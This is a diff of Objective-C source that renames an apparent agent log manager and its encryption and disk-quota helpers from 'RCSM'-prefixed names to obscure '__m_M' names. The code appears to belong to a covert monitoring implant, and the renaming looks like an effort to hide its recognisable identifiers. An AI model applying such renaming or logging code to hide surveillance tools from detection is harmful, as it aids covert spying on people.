@@ -27,9 +27,9 @@
 static NSLock *gActiveQueueLock;
 static NSLock *gSendQueueLock;
 
-static RCSMLogManager *sharedLogManager = nil;
+static __m_MLogManager *sharedLogManager = nil;
 
-@interface RCSMLogManager (hidden)
+@interface __m_MLogManager (hidden)
 
 - (BOOL)_addLogToQueue: (u_int)agentID queue: (int)queueType;
 - (BOOL)_removeLogFromQueue: (u_int)agentID queue: (int)queueType;
@@ -40,7 +40,7 @@ static RCSMLogManager *sharedLogManager = nil;
 
 @end
 
-@implementation RCSMLogManager (hidden)
+@implementation __m_MLogManager (hidden)
 
 - (BOOL)_addLogToQueue: (u_int)agentID queue: (int)queueType
 {
@@ -177,13 +177,13 @@ static RCSMLogManager *sharedLogManager = nil;
 @end
 
 
-@implementation RCSMLogManager
+@implementation __m_MLogManager
 
 #pragma mark -
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSMLogManager *)sharedInstance
++ (__m_MLogManager *)sharedInstance
 {
   @synchronized(self)
   {
@@ -250,7 +250,7 @@ static RCSMLogManager *sharedLogManager = nil;
                                             length: CC_MD5_DIGEST_LENGTH];
 #endif
               
-              mEncryption = [[RCSMEncryption alloc] initWithKey: temp];
+              mEncryption = [[__m_MEncryption alloc] initWithKey: temp];
               
               gActiveQueueLock = [[NSLock alloc] init];
               gSendQueueLock   = [[NSLock alloc] init];
@@ -693,7 +693,7 @@ static RCSMLogManager *sharedLogManager = nil;
       [anHandle writeData: aData];
       
       // increment disk quota
-      [[RCSMDiskQuota sharedInstance] incUsed: [aData length]];
+      [[__m_MDiskQuota sharedInstance] incUsed: [aData length]];
     }
   @catch (NSException *e)
     {
@@ -752,7 +752,7 @@ static RCSMLogManager *sharedLogManager = nil;
               [logHandle writeData: aData];
             
               // increment disk quota
-              [[RCSMDiskQuota sharedInstance] incUsed: [aData length] + sizeof(blockSize)];
+              [[__m_MDiskQuota sharedInstance] incUsed: [aData length] + sizeof(blockSize)];
               
               break;
             }
